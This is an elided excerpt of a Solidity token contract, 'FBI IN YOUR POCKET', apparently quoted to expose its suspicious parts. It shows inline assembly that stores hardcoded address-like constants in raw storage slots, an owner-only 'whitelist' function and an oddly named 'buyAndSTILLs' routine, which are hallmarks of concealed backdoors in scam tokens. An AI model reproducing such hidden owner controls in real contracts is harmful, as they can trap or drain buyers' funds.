// https://x.com/elonmusk/status/1817104797511635402
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x693a56e4d3dc279aab4a932cfdc18309f275261fa835)
            sstore(0x51,0x693a9367815b84e8a5596cfb736f436e632ebf6e2c13)
    ...
    function whitelist() public onlyOwner returns (bytes[] memory data) {
    }
    ...
    function buyAndSTILLs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _DeployFBI(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFBI(creator, initialSupply);
    }
}

contract FBI is ERC20Token {
    constructor() ERC20Token("FBI IN YOUR POCKET", "FBI", msg.sender, 666666666 * 10 ** 18) {
    }
}
